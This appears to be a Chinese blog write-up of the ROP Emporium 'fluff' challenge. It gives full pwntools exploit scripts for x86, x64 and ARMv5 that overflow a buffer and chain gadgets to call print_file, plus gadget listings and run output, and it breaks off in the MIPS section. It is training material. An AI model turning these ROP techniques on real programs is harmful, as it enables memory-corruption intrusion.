id=\"fluff\">fluff</h2>\r\n<p>这道题的考点在于无法直接使用常用的代码构造pop链，需要详细了解指令集的各类具体指令，综合利用其他非常用类型指令构造合适的pop链将字符串写入data段，再跳转到print_file函数运行。</p>\r\n<h3 id=\"x86和x64\">x86和x64</h3>\r\n<p>这里仅给出exp，具体分析见此<a href=\"https://bbs.pediy.com/thread-272054.htm\">文章</a>，内容比较详细，不再重复讲解。</p>\r\n<span id=\"more\"></span>\r\n<ol type=\"1\">\r\n<li><p>x86</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"> </span><br><span class=\"line\">context.arch = <span class=\"string\">&quot;i386&quot;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\">context.os = <span class=\"string\">&quot;linux&quot;</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getio</span>(<span class=\"params\">program</span>):</span><br><span class=\"line\">    io = process(program)</span><br><span class=\"line\">    <span class=\"comment\"># io = gdb.debug([program], &quot;b *0x80483d0&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> io</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getMask</span>(<span class=\"params\">nValue, nOutput</span>):</span><br><span class=\"line\">    <span class=\"comment\"># nOutput = pext(nValue, nMask)</span></span><br><span class=\"line\">    <span class=\"comment\"># eg.</span></span><br><span class=\"line\">    <span class=\"comment\">#   nValue = 0xFF</span></span><br><span class=\"line\">    <span class=\"comment\">#   nMask = 0xF4</span></span><br><span class=\"line\">    <span class=\"comment\">#   -&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">#   nOutput = 0x1F</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    nMask = <span class=\"number\">0</span></span><br><span class=\"line\">    nLastBitFoundInValue = <span class=\"number\">1</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># find the highest valid bit</span></span><br><span class=\"line\">    nInvalidBits = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):  <span class=\"comment\"># ascii</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (nOutput &amp; (<span class=\"number\">1</span> &lt;&lt; i)) != <span class=\"number\">0</span>:</span><br><span class=\"line\">            nInvalidBits = i</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(nInvalidBits + <span class=\"number\">1</span>): </span><br><span class=\"line\">        <span class=\"keyword\">while</span> (nOutput &amp; <span class=\"number\">1</span>) != (nValue &amp; <span class=\"number\">1</span>):</span><br><span class=\"line\">            nLastBitFoundInValue += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> nLastBitFoundInValue == <span class=\"number\">33</span>:  <span class=\"comment\"># 4 Bytes</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">            nValue = nValue &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"comment\"># found</span></span><br><span class=\"line\">        nOutput = nOutput &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">        nValue = nValue &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\">        nMask |= <span class=\"number\">1</span> &lt;&lt; (nLastBitFoundInValue - <span class=\"number\">1</span>)</span><br><span class=\"line\">        nLastBitFoundInValue += <span class=\"number\">1</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">return</span> nMask</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">nBufOverflowIndex = <span class=\"number\">44</span></span><br><span class=\"line\">pPltPrintFile = <span class=\"number\">0x080483D0</span></span><br><span class=\"line\">pDataSection = <span class=\"number\">0x0804A018</span></span><br><span class=\"line\">pGadgetPopEcx_bswap = <span class=\"number\">0x08048558</span>    <span class=\"comment\"># pop ecx ; bswap ecx ; ret</span></span><br><span class=\"line\">pGadgetPopEbp = <span class=\"number\">0x080485bb</span>          <span class=\"comment\"># pop ebp ; ret</span></span><br><span class=\"line\">pGadgetPext = <span class=\"number\">0x08048543</span>            <span class=\"comment\"># mov eax,ebp;mov ebx,0xb0bababa; pext edx,ebx,eax</span></span><br><span class=\"line\">pGadgetXchg = <span class=\"number\">0x08048555</span>            <span class=\"comment\"># xchg byte ptr [ecx], dl ; ret   把字符写入.data</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1. padding</span></span><br><span class=\"line\">payload = <span class=\"built_in\">bytes</span>(<span class=\"string\">&quot;C&quot;</span> * nBufOverflowIndex, encoding = <span class=\"string\">&quot;ascii&quot;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># payload += p32(pPltPrintFile) </span></span><br><span class=\"line\"><span class=\"comment\"># 2. Loop</span></span><br><span class=\"line\">strEdx = <span class=\"string\">&quot;flag.txt&quot;</span></span><br><span class=\"line\">nValue = <span class=\"number\">0xb0bababa</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(strEdx)):</span><br><span class=\"line\">    nMask = getMask(nValue, <span class=\"built_in\">ord</span>(strEdx[i]))</span><br><span class=\"line\">    <span class=\"comment\"># print(hex(nMask))</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 2.1 write .data addr into ecx</span></span><br><span class=\"line\">    payload += p32(pGadgetPopEcx_bswap)        <span class=\"comment\"># 0x08048558 : pop ecx ; bswap ecx ; ret</span></span><br><span class=\"line\">    payload += p32(pDataSection + i, endianness=<span class=\"string\">&quot;big&quot;</span>)        <span class=\"comment\"># Big Endian    pop to ecx</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 2.2 write nMask into ebp</span></span><br><span class=\"line\">    payload += p32(pGadgetPopEbp)        <span class=\"comment\"># 0x080485bb : pop ebp ; ret</span></span><br><span class=\"line\">    payload += p32(nMask)                <span class=\"comment\"># getMask(&quot;flag.txt&quot;[i])    pop to ebp</span></span><br><span class=\"line\">    payload += p32(pGadgetPext)            <span class=\"comment\"># 0x08048543 : mov eax,ebp;mov ebx,0xb0bababa; pext edx,ebx,eax</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 2.3 write &quot;flag.txt&quot; into .data</span></span><br><span class=\"line\">    payload += p32(pGadgetXchg)            <span class=\"comment\"># 0x08048555 : xchg byte ptr [ecx], dl ; ret   把字符写入.data</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 3. print_file(&quot;flag.txt&quot;)</span></span><br><span class=\"line\">payload += p32(pPltPrintFile)            <span class=\"comment\"># 0x080483d0</span></span><br><span class=\"line\">payload += p32(<span class=\"number\">0x080483B0</span>)                <span class=\"comment\"># 伪造的返回地址</span></span><br><span class=\"line\">payload += p32(pDataSection)</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">io = getio(<span class=\"string\">&quot;./fluff32&quot;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b&quot;&gt; &quot;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># failed with unknown reason, when it runs in print_file-&gt;fopen-&gt;, it failed.</span></span><br></pre></td></tr></table></figure></li>\r\n<li><p>x64</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding:utf-8</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"> </span><br><span class=\"line\">context.arch = <span class=\"string\">&quot;amd64&quot;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">64</span></span><br><span class=\"line\">context.os = <span class=\"string\">&quot;linux&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getio</span>(<span class=\"params\">program</span>):</span><br><span class=\"line\">    io = process(program)</span><br><span class=\"line\">    <span class=\"comment\"># io = gdb.debug([program], &quot;b main&quot;)</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> io;</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">nBufOverflowIndex = <span class=\"number\">0x28</span></span><br><span class=\"line\">pPltPrintFile = <span class=\"number\">0x0000000000400510</span></span><br><span class=\"line\">pGadgetBextrToSetRbx = <span class=\"number\">0x40062a</span>     <span class=\"comment\"># pop rdx;</span></span><br><span class=\"line\">                                    <span class=\"comment\"># pop rcx;</span></span><br><span class=\"line\">                                    <span class=\"comment\"># add rcx, 0x3ef2;</span></span><br><span class=\"line\">                                    <span class=\"comment\"># bextr rbx, rcx, rdx;</span></span><br><span class=\"line\">                                    <span class=\"comment\"># ret;  </span></span><br><span class=\"line\">                                    <span class=\"comment\"># 满足[rbx+al]这个地址存有目标字符，可以用SetRbxToAddr函数实现</span></span><br><span class=\"line\">pGadgetXlatToSetAl = <span class=\"number\">0x400628</span>       <span class=\"comment\"># xlat   BYTE PTR ds:[rbx]; --&gt; al = [rbx+al]</span></span><br><span class=\"line\">                                    <span class=\"comment\"># al保存目标字节，比如&quot;f&quot;， 可以用SetAlToByte函数实现</span></span><br><span class=\"line\">pGadgetPopRdi = <span class=\"number\">0x00000000004006a3</span>  <span class=\"comment\"># pop rdi ; ret</span></span><br><span class=\"line\">pGadgetStos = <span class=\"number\">0x400639</span>              <span class=\"comment\"># stos   BYTE PTR es:[rdi],al  往.data逐字节写入字符串&quot;flag.txt&quot;</span></span><br><span class=\"line\">pDataSection = <span class=\"number\">0x0000000000601028</span>   <span class=\"comment\"># .data地址</span></span><br><span class=\"line\">g_byRealTimeAlWhenFirstXlat = <span class=\"number\">0xb</span>   <span class=\"comment\"># 和xlat指令有关这里需要调试一下，看当时的al值为多少</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">setRbxToAddr</span>(<span class=\"params\">pTargetAddr, rop</span>):</span><br><span class=\"line\">    rdx = ((<span class=\"number\">2</span>**<span class=\"number\">6</span>)&lt;&lt;<span class=\"number\">8</span>) | <span class=\"number\">0x00</span>    <span class=\"comment\"># rcx: start 0, len 64</span></span><br><span class=\"line\">    rcx = pTargetAddr</span><br><span class=\"line\">    rop.raw(pGadgetBextrToSetRbx)</span><br><span class=\"line\">    rop.raw(rdx)</span><br><span class=\"line\">    rop.raw(rcx - <span class=\"number\">0x3ef2</span>)      <span class=\"comment\"># add rcx, 0x3ef2;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">setAlToByte</span>(<span class=\"params\">byTarget, rop, elf, byRealTimeAl</span>):</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 2.1 set rbx to addr</span></span><br><span class=\"line\">    pTargetByteAddr = <span class=\"built_in\">next</span>(elf.search(byTarget))</span><br><span class=\"line\">    pTargetRbx = pTargetByteAddr - byRealTimeAl</span><br><span class=\"line\">    setRbxToAddr(pTargetRbx, rop)</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># 2.2 set al to the byte of &quot;flag.txt&quot;</span></span><br><span class=\"line\">    rop.raw(pGadgetXlatToSetAl)     <span class=\"comment\"># xlat   BYTE PTR ds:[rbx]; --&gt; al = [rbx+al]</span></span><br><span class=\"line\"> </span><br><span class=\"line\">program = <span class=\"string\">&quot;./fluff&quot;</span></span><br><span class=\"line\">io = getio(program)</span><br><span class=\"line\">elf = ELF(program)</span><br><span class=\"line\">rop = ROP(program)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 1. buf overflow </span></span><br><span class=\"line\">padding = <span class=\"string\">b&quot;A&quot;</span> * nBufOverflowIndex</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 2. write &quot;flag.txt&quot; into .data section</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 2.1 rdi not used later</span></span><br><span class=\"line\">rop.raw(pGadgetPopRdi)</span><br><span class=\"line\">rop.raw(pDataSection)</span><br><span class=\"line\"> </span><br><span class=\"line\">strFlagTxt = <span class=\"string\">&quot;flag.txt&quot;</span></span><br><span class=\"line\">byRealTimeAl = g_byRealTimeAlWhenFirstXlat  <span class=\"comment\"># al的初始值</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> strFlagTxt:</span><br><span class=\"line\">    setAlToByte(c, rop, elf, byRealTimeAl)</span><br><span class=\"line\">    byRealTimeAl = <span class=\"built_in\">ord</span>(c)    <span class=\"comment\"># 更新al</span></span><br><span class=\"line\">    rop.raw(pGadgetStos) </span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 4. print_file(&quot;flag.txt&quot;)</span></span><br><span class=\"line\">rop.raw(pGadgetPopRdi)</span><br><span class=\"line\">rop.raw(pDataSection)</span><br><span class=\"line\">rop.raw(pPltPrintFile)</span><br><span class=\"line\"> </span><br><span class=\"line\">payload = <span class=\"string\">b&quot;&quot;</span>.join([</span><br><span class=\"line\">    padding,</span><br><span class=\"line\">    rop.chain()</span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">&quot;&gt;&quot;</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"><span class=\"comment\"># pause()</span></span><br><span class=\"line\"> </span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(io.recv(timeout=<span class=\"number\">10</span>))</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure></li>\r\n</ol>\r\n<blockquote>\r\n<p>值得注意的是，上述代码在本地ubuntu主机测试运行时，发生错误，无法获取flag，经过pwndbg调试发现已经成功将<code>flag.txt</code>字符串写入data段内，但在后续调用<code>print_file</code>函数时，进入<code>fopen</code>函数后产生错误。</p>\r\n</blockquote>\r\n<h3 id=\"armv5\">armv5</h3>\r\n<p>考点：联合使用常规arm指令和thumb指令构造pop链，进行数据写入。</p>\r\n<h4 id=\"分析\">分析</h4>\r\n<p>通过初步观察，未发现 <strong>sw</strong> 指令，无法直接将数据写入data段内，但代码中存在 <strong>bx</strong> 指令，该指令可以在 arm指令集和thumb指令集之间进行跳转，因此猜测可能需要利用thumb指令集才可以写入数据。</p>\r\n<p>首先查看gadget，可以看到如下指令：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:000105EC                               questionableGadgets</span><br><span class=\"line\">.text:000105EC 0B 00 BD E8                   POP     &#123;R0,R1,R3&#125;</span><br><span class=\"line\">.text:000105F0 11 FF 2F E1                   BX      R1</span><br></pre></td></tr></table></figure>\r\n<p>在返回地址覆盖指令地址<code>0x000105EC</code>可以将栈数据写入 <em>R0</em>, <em>R1</em>, <em>R3</em> 寄存器中，但ARM指令中没有相关<strong>SW</strong>指令，因此搜索thumb指令：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary fluff_armv5 --thumb</span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000105f2 : b #0x10854 ; movs r0, r0 ; b #0x1093a ; movs r0, r0 ; b #0x1093e ; movs r0, r0 ; b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class=\"line\">0x000105f6 : b #0x1093a ; movs r0, r0 ; b #0x1093e ; movs r0, r0 ; b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class=\"line\">0x000105fa : b #0x1093e ; movs r0, r0 ; b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class=\"line\">0x000105fe : b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class=\"line\">0x00010602 : b #0x10946 ; blx lr</span><br><span class=\"line\">0x00010604 : blx lr</span><br><span class=\"line\">0x000103ec : bx r0</span><br><span class=\"line\">0x000103da : ldr r5, [r4, #0x64] ; ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; ldrsh r7, [r3, r5] ; ldr r5, [r4, #0x64] ; ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class=\"line\">0x000103e2 : ldr r5, [r4, #0x64] ; ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class=\"line\">0x000103dc : ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; ldrsh r7, [r3, r5] ; ldr r5, [r4, #0x64] ; ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class=\"line\">0x000103e4 : ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class=\"line\">0x000103e0 : ldrsh r7, [r3, r5] ; ldr r5, [r4, #0x64] ; ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class=\"line\">0x000103de : lsls r7, r3, #1 ; ldrsh r7, [r3, r5] ; ldr r5, [r4, #0x64] ; ldrsh r4, [r4, r5] ; lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class=\"line\">0x000103e6 : lsls r7, r3, #1 ; str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class=\"line\">0x000105f4 : movs r0, r0 ; b #0x1093a ; movs r0, r0 ; b #0x1093e ; movs r0, r0 ; b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class=\"line\">0x000105f8 : movs r0, r0 ; b #0x1093e ; movs r0, r0 ; b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class=\"line\">0x000105fc : movs r0, r0 ; b #0x10942 ; movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class=\"line\">0x00010600 : movs r0, r0 ; b #0x10946 ; blx lr</span><br><span class=\"line\">0x000103ea : str r6, [r5, #0x44] ; bx r0</span><br><span class=\"line\">0x000103e8 : str r7, [r3, #0x54] ; str r6, [r5, #0x44] ; bx r0</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 20</span><br></pre></td></tr></table></figure>\r\n<p>发现在<code>0x000103ea</code>和<code>0x000103e8</code>处存在 <strong>str</strong> 指令，且较为简单，因此可以使用<code>000105F0</code>处的 <strong>bx</strong> 指令跳转到 <strong>str</strong> 指令地址处，进行数据写入，由于 <strong>str r6, [r5, #0x44]</strong> 指令使用了 <em>r6</em>，<em>r5</em> 两个寄存器，因此需要找到指令将数据写入 <em>r6</em>，<em>r5</em> 两个寄存器，再次搜索arm指令，结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary fluff_armv5 --only <span class=\"string\">&quot;pop&quot;</span></span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\">0x000105cc : pop &#123;fp, pc&#125;</span><br><span class=\"line\">0x00010474 : pop &#123;r3, pc&#125;</span><br><span class=\"line\">0x000105ac : pop &#123;r4, pc&#125;</span><br><span class=\"line\">0x00010658 : pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">Unique gadgets found: 4</span><br></pre></td></tr></table></figure>\r\n<p>可以使用<code>0x00010658</code>处的 <strong>pop</strong> 指令将数据写入 <em>r5</em>，<em>r6</em> 寄存器，其中r5写入地址，r6写入字符串，同时向pc寄存器中写入<code>0x000105EC</code>，以便后续跳转到thumb指令中。综上，使用<code>0x000105EC</code>，<code>0x000103ea</code>，<code>0x00010658</code>构造pop链，将<code>flag.txt</code>字符串写入data段内，再调用print_file函数，即可获取flag。</p>\r\n<h4 id=\"编写exp\">编写exp</h4>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;arm&#x27;</span></span><br><span class=\"line\">context.endian = <span class=\"string\">&#x27;little&#x27;</span></span><br><span class=\"line\">context.bits = <span class=\"number\">32</span></span><br><span class=\"line\"></span><br><span class=\"line\">p = process([<span class=\"string\">&#x27;qemu-arm&#x27;</span>, <span class=\"string\">&#x27;-L&#x27;</span>, <span class=\"string\">&#x27;/usr/arm-linux-gnueabi/&#x27;</span>, <span class=\"string\">&#x27;./fluff_armv5&#x27;</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">pop_r0_r1_r3_bx_r1 = <span class=\"number\">0x000105EC</span>         <span class=\"comment\"># POP &#123;R0,R1,R3&#125;; BX R1</span></span><br><span class=\"line\">pop_r4_r10_pc = <span class=\"number\">0x00010658</span>              <span class=\"comment\"># pop &#123;R4-R10,PC&#125;</span></span><br><span class=\"line\">str_r6_r5_0x44_bx_r0 = <span class=\"number\">0x000103ea</span>       <span class=\"comment\"># thumb: str r6, [r5, #0x44] ; bx r0</span></span><br><span class=\"line\"></span><br><span class=\"line\">data_addr = <span class=\"number\">0x00021024</span></span><br><span class=\"line\">print_file = <span class=\"number\">0x000104B0</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload  = <span class=\"string\">b&quot;A&quot;</span> * (<span class=\"number\">0x24</span>)</span><br><span class=\"line\">payload += p32(pop_r4_r10_pc)\t\t\t\t<span class=\"comment\"># 覆盖返回地址，以便将数据写入r5，r6寄存器</span></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;BBBB&quot;</span>\t\t\t\t\t\t\t<span class=\"comment\"># pop r4</span></span><br><span class=\"line\">payload += p32(data_addr-<span class=\"number\">0x44</span>)\t\t\t\t<span class=\"comment\"># pop r5，因为str r6, [r5, #0x44]指令中目的地址为r5+0x44，所以此处减去0x44</span></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;flag&quot;</span>\t\t\t\t\t\t\t<span class=\"comment\"># pop r6</span></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;CCCC&quot;</span> * <span class=\"number\">4</span>\t\t\t\t\t\t<span class=\"comment\"># pop r7-r10</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(pop_r0_r1_r3_bx_r1)\t\t\t<span class=\"comment\"># pop pc，当pop &#123;R4-R10,PC&#125;执行完毕后，跳转到0x000105EC处开始执行</span></span><br><span class=\"line\">payload += p32(pop_r4_r10_pc)               <span class=\"comment\"># pop r0，为后续str r6, [r5, #0x44] ; bx r0执行后，返回跳转到0x00010658处做准备</span></span><br><span class=\"line\">payload += p32(str_r6_r5_0x44_bx_r0+<span class=\"number\">1</span>)      <span class=\"comment\"># pop r1，当POP &#123;R0,R1,R3&#125;; BX R1执行完毕后，跳转到0x000103ea处开始执行thumb指令</span></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;DDDD&quot;</span>\t\t\t\t\t\t\t<span class=\"comment\"># pop r3</span></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;DDDD&quot;</span>                      \t<span class=\"comment\"># pop r4，当bx r0执行返回后，执行pop &#123;R4-R10,PC&#125;，该处用于弹出到r4寄存器</span></span><br><span class=\"line\">payload += p32(data_addr+<span class=\"number\">4</span>-<span class=\"number\">0x44</span>)            <span class=\"comment\"># pop r5，data段地址+4-0x44</span></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;.txt&quot;</span>                          <span class=\"comment\"># pop r6</span></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;CCCC&quot;</span> * <span class=\"number\">4</span>\t\t\t\t\t\t<span class=\"comment\"># pop r7-r10</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload += p32(pop_r0_r1_r3_bx_r1)\t\t\t<span class=\"comment\"># pop pc，当pop &#123;R4-R10,PC&#125;执行完毕后，跳转到0x000105EC处开始执行</span></span><br><span class=\"line\">payload += p32(pop_r0_r1_r3_bx_r1)          <span class=\"comment\"># pop r0，为后续str r6, [r5, #0x44] ; bx r0执行后，返回跳转到0x000105EC处做准备</span></span><br><span class=\"line\">payload += p32(str_r6_r5_0x44_bx_r0 + <span class=\"number\">1</span>)    <span class=\"comment\"># pop r1，当POP &#123;R0,R1,R3&#125;; BX R1执行完毕后，跳转到0x000103ea处开始执行thumb指令</span></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;EEEE&quot;</span>                          <span class=\"comment\"># pop r3</span></span><br><span class=\"line\">payload += p32(data_addr)\t\t\t\t\t<span class=\"comment\"># pop r0，当bx r0执行返回后，执行POP &#123;R0,R1,R3&#125;; BX R1，弹出data段地址到r0，作为print_file函数的参数</span></span><br><span class=\"line\">payload += p32(print_file)\t\t\t\t\t<span class=\"comment\"># pop r1, 将跳转到print_file函数</span></span><br><span class=\"line\">payload += <span class=\"string\">b&quot;FFFF&quot;</span>\t\t\t\t\t\t\t<span class=\"comment\"># pop r3</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\r\n<blockquote>\r\n<p>bx指令会判断目的地址最低位是否为1，若为1，则将目的地址处视为thumb指令，否则视为arm指令。</p>\r\n</blockquote>\r\n<h4 id=\"运行结果\">运行结果</h4>\r\n<p>exp运行结果如下：</p>\r\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ python exp.py </span><br><span class=\"line\">[+] Starting <span class=\"built_in\">local</span> process <span class=\"string\">&#x27;/usr/bin/qemu-arm&#x27;</span>: pid 3100</span><br><span class=\"line\">[*] Switching to interactive mode</span><br><span class=\"line\">fluff by ROP Emporium</span><br><span class=\"line\">ARMv5</span><br><span class=\"line\"></span><br><span class=\"line\">You know changing these strings means I have to rewrite my solutions...</span><br><span class=\"line\">&gt; Thank you!</span><br><span class=\"line\">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br><span class=\"line\">qemu: uncaught target signal 11 (Segmentation fault) - core dumped</span><br><span class=\"line\">[*] Got EOF <span class=\"keyword\">while</span> reading <span class=\"keyword\">in</span> interactive</span><br></pre></td></tr></table></figure>\r\n<blockquote>\r\n<p>armv5-hf和armv5类似，不过其thumb指令仅能利用 <strong>strh</strong> 指令，每次只能填充2个字节，共需4次才能写入<code>flag.txt</code>字符串。</p>\r\n</blockquote>\r\n<h3 id=\"mipsel\">mipsel</h3>\r\n<h4 id=\"分析-1\">分析</h4>\r\n<p>在IDA中直接查看可利用的gadget：</p>\r\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.text:00400930                               questionableGadgets:                     # gadget1 $s1=0 </span><br><span class=\"line\">.text:00400930 08 00 B9 8F                   lw      $t9, 8($sp)</span><br><span class=\"line\">.text:00400934 04 00 AC 8F                   lw      $t4, 4($sp)</span><br><span class=\"line\">.text:00400938 26 88 31 02                   xor     $s1, $s1</span><br><span class=\"line\">.text:0040093C 41 00 04 3C 70 2C 84 34       li      $a0, 0x412C70</span><br><span class=\"line\">.text:00400944 09 F8 20 03                   jalr    $t9</span><br><span class=\"line\">.text:00400948 0C 00 BD 23                   addi    $sp, 0xC</span><br><span class=\"line\">.text:00400948</span><br><span class=\"line\">.text:0040094C 08 00 B9 8F                   lw      $t9, 8($sp)                      # gadget2 $s2 = 4($sp)</span><br><span class=\"line\">.text:00400950 04 00 B2 8F                   lw      $s2, 4($sp)</span><br><span class=\"line\">.text:00400954 41 00 0C 3C 74 2C 8C 35       li      $t4, 0x412C74</span><br><span class=\"line\">.text:0040095C 09 F8 20 03                   jalr    $t9</span><br><span class=\"line\">.text:00400960 0C 00 BD 23                   addi    $sp, 0xC</span><br><span class=\"line\">.text:00400960</span><br><span class=\"line\">.text:00400964 04 00 B9 8F                   lw      $t9, 4($sp)                      # gadget3 xor $s1, $s2</span><br><span class=\"line\">.text:00400968 26 88 32 02                   xor     $s1, $s2</span><br><span class=\"line\">.text:0040096C 41 00 05 3C 00 15 A5 34       li      $a1, 0x411500</span><br><span class=\"line\">.text:00400974 09 F8 20 03                   jalr    $t9</span><br><span class=\"line\">.text:00400978 08 00 BD 23                   addi    $sp, 8</span><br><span class=\"line\">.text:00400978</span><br><span class=\"line\">.text:0040097C 04 00 B9 8F                   lw      $t9, 4($sp)                      # gadget4 swap($s0, $s1)</span><br><span class=\"line\">.text:00400980 26 80 11 02                   xor     $s0, $s1</span><br><span class=\"line\">.text:00400984 26 88 11 02                   xor     $s1, $s0, $s1</span><br><span class=\"line\">.text:00400988 26 80 11 02                   xor     $s0, $s1</span><br><span class=\"line\">.text:0040098C 41 00 0D 3C 04 15 AD 35       li      $t5, 0x411504</span><br><span class=\"line\">.text:00400994 09 F8 20 03                   jalr    $t9</span><br><span class=\"line\">.text:00400998 08 00 BD 23                   addi    $sp, 